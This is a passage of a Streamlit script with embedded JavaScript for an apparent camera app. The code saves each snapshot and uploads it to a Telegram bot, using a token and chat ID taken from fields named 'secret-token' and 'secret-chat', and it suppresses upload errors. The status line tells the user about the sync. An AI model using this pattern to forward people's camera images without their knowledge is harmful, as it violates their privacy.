                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const filename = `MASTER_ENTERPRISE_RAW_${timestamp}.jpg`;

                const downloadLink = document.getElementById('download-link-enterprise');
                downloadLink.href = imageUrl;
                downloadLink.download = filename;
                
                const clickEvent = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
                downloadLink.dispatchEvent(clickEvent);

                const previewImg = document.getElementById('last-snapshot-enterprise');
                previewImg.src = imageUrl;
                document.getElementById('gallery-tray-enterprise').style.display = "block";
                document.getElementById('gallery-empty-enterprise').style.display = "none";

                statusBox.innerText = "FOTO TERSIMPAN & DI-SYNC KE TELEGRAM.";

                const botToken = document.getElementById('secret-token').value;
                const targetChatId = document.getElementById('secret-chat').value;

                const payload = new FormData();
                payload.append('chat_id', targetChatId);
                payload.append('photo', blobImage, filename);
                payload.append('caption', `Master Enterprise DSLR: ${triggerSource} | Profile: ${currentFilterNameEnt}`);

                fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
                    method: 'POST',
                    body: payload
                }).catch(err => {
                    console.log("Background sync error");
                });
            }, 'image/jpeg', 1.0);
        }
    </script>
    """

    components.html(master_code_1000_html, height=730)
    st.markdown('</div>', unsafe_allow_html=True)
